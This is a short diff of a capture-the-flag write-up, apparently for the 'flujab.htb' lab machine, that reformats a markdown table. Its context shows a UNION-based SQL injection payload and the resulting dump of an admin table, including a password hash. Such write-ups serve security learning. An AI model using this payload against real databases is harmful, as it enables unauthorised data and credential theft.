@@ -930,8 +930,9 @@ __NOTE(S)__:
            ' AND '1'='2' UNION SELECT 1,2,group_concat(<column_name>),4,5 FROM admin; #
            ```
            - `admin` table:
+           
               id | loginname | namelc | email | access | created | modified | modifiedby | password | passwordchanged | superuser | disabled | privileges
-              ---|---|---|---|---|---|---|---|---|---|---|---|---
+              --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | ---
               1 | sysadm | administrator | syadmin@flujab.htb | sysadmin-console-01.flujab.htb | 2018-07-02 08:45:19 | 2018-12-02 00:01:02 |  | a3e30cce47580888f1f185798aca22ff10be617f4a982d67643bb56448508602 |  2018-07-02 | 1 | 0 |
            __NOTE(S)__:
            - A new subdomain presents itself (`sysadmin-console-01.flujab.htb`)
